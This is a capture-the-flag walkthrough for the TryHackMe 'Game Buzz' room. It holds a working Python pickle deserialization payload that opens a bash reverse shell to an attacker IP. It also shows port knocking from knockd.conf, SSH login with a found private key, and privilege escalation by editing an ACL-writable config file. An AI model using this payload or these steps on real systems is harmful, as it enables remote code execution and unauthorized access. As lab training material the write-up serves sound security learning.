# Game Buzz

![image](https://user-images.githubusercontent.com/5285547/128932672-b10c018a-8d55-4bfd-8edb-1d4100c0a480.png)

Romm link: https://tryhackme.com/room/gamebuzz

## Enum

Nmap

```
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET OPTIONS HEAD
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Incognito
```



```
sudo nano /etc/hosts  

incognito.com
dev.incogniot.com
```
---
## Port 80 

Checking the main website didn't show much, apart from a button that loads a file with a .pkl extension. 

![image](https://user-images.githubusercontent.com/5285547/128937818-90d5dd7c-561d-4463-8a1c-a79311deb7b5.png)

Also we find a domain name. 

```
sudo nano /etc/hosts  
ip incognito.com
```

## dev.incognito.com

```
sudo nano etc/hosts
IP dev.incogniot.com
```

http://dev.incognito.com/secret/upload/

Finding the endpoint we can try to upload a file of our own. Based on the .pkl file extension this hints at python pickle deserilization. 

## User

If we can get our file to be read from the main website we can get RCE. 

test.pkl (rev shell)

```
#!/usr/bin/env python3
import pickle, os
class pickleSerilization(object):
    def __reduce__(self):
        return (os.system,("bash -c 'bash -i >& /dev/tcp/10.8.153.120/9999 0>&1'",))
pickle.dump(pickleSerilization(), open("rev_shell", "wb"))
```
Running the code gives us the rev_shell file. Upload this at "http://dev.incognito.com/secret/upload/" then call it with the main website.

![image](https://user-images.githubusercontent.com/5285547/128940779-a030648b-e70f-49e1-b35f-53d343d13e96.png)

Now we can access the /home/dev2/ folder to find the user flag. 

---
## User 2

We find a file called "/etc/knockd.conf" that looks intresting. I see some ports we need to knock to open SSH

```
[options]
        logfile = /var/log/knockd.log

[openSSH]
        sequence    = 5020,6120,7340
        seq_timeout = 15
        command     = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j ACCE$
        tcpflags    = syn

[closeSSH]
        sequence    = 9000,8000,7000
        seq_timeout = 15
        command     = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j REJE$
        tcpflags    = syn


5020,6120,7340
```

Doing some more enumeration showed some mails for dev1 in /var/mail, with a message to let ourselfs in! 

![image](https://user-images.githubusercontent.com/5285547/128942053-8354618c-dc30-45b7-b653-2ca97ad1e5a0.png)

Using knock I opend the SSH port then used the id_rsa key to login as dev1. 

```
knock  10.10.28.93 5020 6120 7340

#Now login, copy the rsa to a new file
chmod 600 id_rsa
ssh dv1@IP -i id_rsa
```

![image](https://user-images.githubusercontent.com/5285547/128942276-39b99b82-3826-4ec6-a5a8-341f920dda9b.png)

---
## Root

Enumerating the system again we can see the same file popping up in linpeas with acl permissions set. 

![image](https://user-images.githubusercontent.com/5285547/128942448-bd64f8da-f086-4d76-9c72-6e728f375d2e.png)

Knowing this lets edit the file to test some command execution (as root). 

```
nano /etc/knockd.conf

# acl 

setfacl -m u:dev1:rw /etc/knockd.conf
```







